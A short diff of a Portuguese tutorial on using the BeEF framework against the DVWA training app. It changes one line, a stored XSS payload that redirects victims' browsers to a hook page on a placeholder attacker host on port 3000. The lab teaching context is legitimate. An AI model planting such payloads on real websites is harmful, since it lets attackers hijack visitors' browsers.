@@ -173,7 +173,7 @@ Está é a tela inicial do beef, o usuario padrão é beef e a senha igual
 
 2. No DVWA, insira no campo mensagem este código:
 ```
-<script> document.location="http://Seu-IP/demos/butcher/index.html" </script>
+<script> document.location="http://IP-do-Atacante:3000/demos/butcher/index.html" </script>
 ```
 Este link direciona para uma pagina de teste de ataque XSS pronta. No campo nome coloque qualquer coisa
 
